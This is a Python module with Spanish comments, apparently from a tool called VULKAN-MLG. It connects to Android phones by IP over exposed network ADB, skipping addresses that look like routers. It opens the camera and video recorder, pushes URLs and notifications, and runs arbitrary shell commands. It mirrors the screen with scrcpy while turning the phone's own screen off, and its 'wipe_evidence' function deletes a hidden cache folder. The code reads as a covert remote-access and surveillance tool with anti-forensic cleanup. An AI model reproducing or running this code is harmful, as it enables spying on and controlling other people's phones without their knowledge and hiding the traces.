# core/adb_controller.py - Controlador ADB mejorado
import subprocess
import threading
import time
import os
import sys
import socket

class ADBController:
    """Controlador ADB para dispositivos Android"""
    
    def __init__(self, logger):
        self.logger = logger
        self.current_device = None
        self.adb_path = self.find_adb()
        self.connected_devices = {}  # Cache de conexiones
        self.adb_server_started = False
        self.start_adb_server()
    
    def start_adb_server(self):
        """Iniciar servidor ADB si no está corriendo"""
        if not self.adb_server_started:
            try:
                subprocess.run(f'"{self.adb_path}" start-server', shell=True, capture_output=True, timeout=5)
                self.logger.log("✅ Servidor ADB iniciado", "GREEN")
                self.adb_server_started = True
            except Exception as e:
                self.logger.log(f"⚠️ Error iniciando ADB server: {e}", "YELLOW")
    
    def find_adb(self):
        """Buscar ADB (mejorado)"""
        # Buscar en carpetas comunes
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        search_paths = [
            os.path.join(base_dir, "Adb", "adb.exe"),
            os.path.join(base_dir, "adb", "adb.exe"),
            os.path.join(base_dir, "platform-tools", "adb.exe"),
            "adb",  # En PATH
            "adb.exe"
        ]
        
        for path in search_paths:
            if os.path.exists(path) or (path in ["adb", "adb.exe"] and self.check_command_exists(path)):
                self.logger.log(f"✅ ADB encontrado: {path}", "GREEN")
                return path
        
        self.logger.log("⚠️ ADB no encontrado. Descarga desde: https://developer.android.com/studio/releases/platform-tools", "YELLOW")
        return "adb"
    
    def check_command_exists(self, command):
        """Verificar si comando existe en PATH"""
        try:
            subprocess.run([command, "version"], capture_output=True, timeout=2)
            return True
        except:
            return False
    
    def run_command(self, cmd, device_ip=None, timeout=30):
        """Ejecutar comando ADB con mejor manejo de errores"""
        target = device_ip or self.current_device
        
        if target:
            # Verificar que el dispositivo esté conectado
            if not self.is_device_connected(target):
                if not self.connect_device(target):
                    return "", f"❌ No se pudo conectar a {target}"
            
            full_cmd = f'"{self.adb_path}" -s {target}:5555 {cmd}'
        else:
            full_cmd = f'"{self.adb_path}" {cmd}'
        
        try:
            result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            stdout = result.stdout.strip()
            stderr = result.stderr.strip()
            
            # Verificar errores comunes
            if "device not found" in stderr.lower() or "unable to connect" in stderr.lower():
                self.logger.log(f"⚠️ Dispositivo {target} no disponible", "YELLOW")
                return "", stderr
            
            return stdout, stderr
        except subprocess.TimeoutExpired:
            self.logger.log(f"⏰ Timeout ejecutando: {cmd[:50]}", "YELLOW")
            return "", "Timeout"
        except Exception as e:
            self.logger.log(f"❌ Error: {e}", "RED")
            return "", str(e)
    
    def is_device_connected(self, device_ip):
        """Verificar si dispositivo está conectado"""
        if device_ip in self.connected_devices:
            # Verificar si la conexión sigue activa
            try:
                result = subprocess.run(f'"{self.adb_path}" devices', shell=True, capture_output=True, text=True, timeout=5)
                return f"{device_ip}:5555" in result.stdout and "device" in result.stdout
            except:
                return False
        return False
    
    def connect_device(self, device_ip, max_retries=2):
        """Conectar a dispositivo con reintentos"""
        if device_ip.endswith('.1') or device_ip.endswith('.2'):
            self.logger.log(f"⚠️ {device_ip} parece ser router/PC, omitiendo", "YELLOW")
            return False
        
        self.current_device = device_ip
        
        for attempt in range(max_retries):
            try:
                # Verificar si el puerto está accesible
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((device_ip, 5555))
                sock.close()
                
                if result != 0:
                    if attempt == 0:
                        self.logger.log(f"⚠️ Puerto 5555 cerrado en {device_ip}, reintentando...", "YELLOW")
                    time.sleep(0.5)
                    continue
                
                stdout, stderr = self.run_command(f"connect {device_ip}:5555")
                
                if "connected" in stdout.lower():
                    self.connected_devices[device_ip] = True
                    self.logger.log(f"✅ Conectado a {device_ip}", "GREEN")
                    
                    # Verificar que realmente funciona
                    test_stdout, _ = self.run_command("echo test")
                    if test_stdout:
                        return True
                    else:
                        self.logger.log(f"⚠️ Conexión inestable con {device_ip}", "YELLOW")
                        return False
                else:
                    if attempt < max_retries - 1:
                        self.logger.log(f"⚠️ Reintentando conexión a {device_ip}...", "YELLOW")
                        time.sleep(1)
                    else:
                        self.logger.log(f"❌ No se pudo conectar a {device_ip}", "RED")
                
            except Exception as e:
                if attempt < max_retries - 1:
                    time.sleep(1)
                else:
                    self.logger.log(f"❌ Error conectando a {device_ip}: {e}", "RED")
        
        return False
    
    def disconnect_device(self, device_ip=None):
        """Desconectar dispositivo"""
        target = device_ip or self.current_device
        if target:
            self.run_command(f"disconnect {target}:5555")
            if target in self.connected_devices:
                del self.connected_devices[target]
            self.logger.log(f"🔌 Desconectado de {target}", "DIM")
    
    def start_scrcpy(self, device_ip, device_name):
        """Iniciar scrcpy con verificación"""
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        
        # Buscar scrcpy en múltiples ubicaciones
        scrcpy_paths = [
            os.path.join(base_dir, "Adb", "scrcpy-noconsole.exe"),
            os.path.join(base_dir, "Adb", "scrcpy.exe"),
            os.path.join(base_dir, "tools", "scrcpy.exe"),
            "scrcpy",
            "scrcpy.exe"
        ]
        
        scrcpy_found = None
        for path in scrcpy_paths:
            if os.path.exists(path) or path in ["scrcpy", "scrcpy.exe"]:
                scrcpy_found = path
                break
        
        if not scrcpy_found:
            self.logger.log("❌ scrcpy no encontrado. Descarga desde: https://github.com/Genymobile/scrcpy", "RED")
            return "❌ scrcpy no instalado"
        
        # Verificar conexión antes de lanzar
        if not self.is_device_connected(device_ip):
            if not self.connect_device(device_ip):
                return "❌ Dispositivo no conectado"
        
        cmd = f'"{scrcpy_found}" --serial {device_ip}:5555 --window-title "VULKAN-MLG - {device_name}" --stay-awake --turn-screen-off'
        
        try:
            subprocess.Popen(cmd, shell=True)
            self.logger.log(f"📱 scrcpy iniciado para {device_name}", "GREEN")
            return "✅ Pantalla abierta"
        except Exception as e:
            self.logger.log(f"❌ Error iniciando scrcpy: {e}", "RED")
            return f"❌ Error: {e}"
    
    def open_camera(self):
        """Abrir cámara con verificación"""
        if not self.current_device:
            return "❌ No conectado"
        stdout, stderr = self.run_command('am start -a android.media.action.IMAGE_CAPTURE')
        if "Error" in stderr:
            return f"⚠️ {stderr}"
        self.logger.log("📸 Abriendo cámara...", "CYAN")
        return "✅ Cámara abierta"
    
    def start_video_record(self):
        """Iniciar grabación de video"""
        if not self.current_device:
            return "❌ No conectado"
        stdout, stderr = self.run_command('am start -a android.media.action.VIDEO_CAMERA')
        if "Error" in stderr:
            return f"⚠️ {stderr}"
        self.logger.log("🎥 Iniciando grabación...", "YELLOW")
        return "✅ Grabación iniciada"
    
    def open_url(self, url):
        """Abrir URL con verificación"""
        if not self.current_device:
            return "❌ No conectado"
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        # Escapar correctamente
        url_escaped = url.replace('&', '\\&').replace('?', '\\?')
        stdout, stderr = self.run_command(f'am start -a android.intent.action.VIEW -d "{url_escaped}"')
        
        if "Error" in stderr:
            return f"⚠️ {stderr}"
        self.logger.log(f"🌐 Abriendo {url}", "CYAN")
        return f"✅ Abierto: {url}"
    
    def send_notification(self, message, title="VULKAN-MLG"):
        """Enviar notificación con validación"""
        if not self.current_device:
            return "❌ No conectado"
        
        # Limpiar y escapar mensaje
        message = message.replace('"', '\\"').replace('\n', ' ')[:200]
        title = title.replace('"', '\\"')[:50]
        
        cmd = f'notification post -S "vulkan" -t "{title}" -p "high" "{message}"'
        stdout, stderr = self.run_command(cmd)
        
        if "Error" in stderr:
            # Intentar método alternativo
            alt_cmd = f'am broadcast -a android.intent.action.SEND -t text/plain --es "subject" "{title}" --es "text" "{message}"'
            stdout, stderr = self.run_command(alt_cmd)
        
        self.logger.log(f"🔔 Notificación enviada: {title}", "GREEN")
        return "✅ Notificación enviada"
    
    def execute_shell(self, command):
        """Ejecutar shell con timeout"""
        if not self.current_device:
            return "❌ No conectado"
        
        dangerous = ['rm -rf', 'dd if=', 'format', 'reboot', 'shutdown']
        if any(cmd in command.lower() for cmd in dangerous):
            self.logger.log(f"⚠️ Comando peligroso ejecutado: {command}", "RED")
        
        stdout, stderr = self.run_command(command, timeout=15)
        
        if stderr and "error" in stderr.lower():
            return f"⚠️ Error: {stderr[:200]}"
        
        return stdout if stdout else "✅ Comando ejecutado correctamente"
    
    def wipe_evidence(self):
        """Limpiar evidencia con verificación"""
        if not self.current_device:
            return "❌ No conectado"
        
        stdout, stderr = self.run_command('ls -la /sdcard/.vulkan_cache/', timeout=5)
        
        if "No such file" in stderr:
            return "✅ No hay evidencia que limpiar"
        
        self.run_command('rm -rf /sdcard/.vulkan_cache/')
        self.logger.log("🧹 Evidencia eliminada del dispositivo", "RED")
        return "✅ Evidencia limpiada"
    
    def get_device_info(self):
        """Obtener información del dispositivo"""
        if not self.current_device:
            return None
        
        info = {}
        commands = {
            'model': 'getprop ro.product.model',
            'brand': 'getprop ro.product.brand',
            'android_version': 'getprop ro.build.version.release',
            'sdk': 'getprop ro.build.version.sdk',
            'battery': 'dumpsys battery | grep level'
        }
        
        for key, cmd in commands.items():
            stdout, _ = self.run_command(cmd, timeout=5)
            if stdout:
                info[key] = stdout.strip()
        
        return info